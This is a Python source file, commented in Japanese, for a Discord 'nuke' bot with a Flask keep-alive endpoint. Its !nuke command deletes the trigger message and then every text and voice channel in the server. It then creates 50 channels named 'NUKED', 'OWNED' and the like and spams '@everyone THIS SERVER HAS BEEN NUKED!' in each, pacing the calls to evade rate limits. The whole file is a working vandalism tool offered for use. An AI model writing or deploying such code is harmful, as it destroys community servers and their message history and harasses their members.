import os
import threading
import logging
import asyncio
from flask import Flask
from discord.ext import commands
import discord

# --- ログ設定 ---
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- グローバル変数の定義 ---
app = Flask(__name__)
# メッセージコンテンツ権限を有効化
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Botの準備完了フラグ
bot_is_ready = False

# --- Discord イベントハンドラ ---
@bot.event
async def on_ready():
    """BotがDiscordに正常に接続・ログインしたときに実行されます。"""
    global bot_is_ready

    bot_is_ready = True
    logging.info(f"Discord Bot ログイン完了。ユーザー: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="稼働中 | !nuke"))

@bot.event
async def on_connect():
    """BotがDiscord APIに接続したときに実行されます。"""
    logging.info("Discord Bot 接続中...")

# --- Nuke コマンド ---
@bot.command()
async def nuke(ctx):
    """サーバーのチャンネルを全て破壊し、新しいチャンネルを大量に作成します。"""
    # 実行したコマンドを削除
    await ctx.message.delete()

    guild = ctx.guild
    
    # 権限チェック
    if not guild.me.guild_permissions.manage_channels:
        await ctx.author.send("エラー: Botに「チャンネルの管理」権限がありません。")
        return

    # --- フェーズ1: 全チャンネルの削除 ---
    logging.info(f"{guild.name} でチャンネルの削除を開始します...")
    channels_to_delete = [c for c in guild.channels if isinstance(c, (discord.TextChannel, discord.VoiceChannel))]
    for channel in channels_to_delete:
        try:
            await channel.delete()
            logging.info(f"チャンネル '{channel.name}' を削除しました。")
            # APIのレートリミットを回避するための待機
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            logging.warning(f"チャンネル '{channel.name}' の削除に失敗しました (権限不足)。")
        except discord.HTTPException as e:
            logging.error(f"チャンネル '{channel.name}' の削除中にHTTPエラーが発生しました: {e}")
            await asyncio.sleep(5) # レートリミットに引っかかった場合、少し長く待機

    # --- フェーズ2: 新しいチャンネルの大量作成 ---
    logging.info(f"{guild.name} でチャンネルの作成を開始します...")
    nuke_channel_names = [
        "NUKED", "WASTED", "DESTROYED", "OOPS", "ERROR 404",
        "SERVER GONE", "BYE BYE", "R.I.P", "F", "OWNED",
        "GET NUKED", "NO MERCY", "GONE", "DELETED", "VANISHED"
    ]
    
    # 50個のチャンネルを作成するループ
    for i in range(50):
        try:
            # ランダムな名前でテキストチャンネルを作成
            channel_name = f"-{nuke_channel_names[i % len(nuke_channel_names)]}-"
            new_channel = await guild.create_text_channel(channel_name)
            logging.info(f"チャンネル '{new_channel.name}' を作成しました。")
            
            # 作成したチャンネルにメッセージを投稿
            await new_channel.send("@everyone THIS SERVER HAS BEEN NUKED! @everyone")
            
            # APIのレートリミットを回避するための待機
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            logging.warning("チャンネルの作成に失敗しました (権限不足)。")
            break # 権限がない場合は作成を中止
        except discord.HTTPException as e:
            logging.error(f"チャンネル作成中にHTTPエラーが発生しました: {e}")
            await asyncio.sleep(5) # レートリミットに引っかかった場合、少し長く待機

    logging.info("Nukeコマンドの実行が完了しました。")


# --- KeepAlive/ヘルスチェック エンドポイント ---

@app.route("/")
def health_check():
    """Render/UptimeRobotからのヘルスチェックに応答します。"""
    if bot_is_ready:
        logging.info("KeepAlive Check: OK (200)")
        return "Bot is running and ready!", 200
    else:
        logging.warning("KeepAlive Check: Not Ready (503)")
        return "Bot is starting up...", 503

# --- Discord Bot 実行ロジック ---

def start_bot():
    """Botの実行（ブロッキング処理）を開始します。"""
    global bot_is_ready

    TOKEN = os.environ.get("DISCORD_TOKEN")
    if not TOKEN:
        logging.error("FATAL ERROR: DISCORD_TOKEN 環境変数が設定されていません。")
        bot_is_ready = False
        return

    logging.info(f"DISCORD_TOKEN を読み込みました (Preview: {TOKEN[:5]}...)")
    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        logging.error("致命的なエラー: DISCORD_TOKEN が不正です。トークンを確認してください。")
        bot_is_ready = False
    except Exception as e:
        logging.error(f"Bot 実行中に予期せぬエラーが発生しました: {e}")
        bot_is_ready = False

# --- メイン実行 ---

if __name__ == '__main__':
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.start()

    port = int(os.environ.get("PORT", 8080))
    logging.info(f"Webサーバーがポート {port} で起動待機中 (ProcfileによるGunicorn起動が必要です)")
    app.run(host='0.0.0.0', port=port)
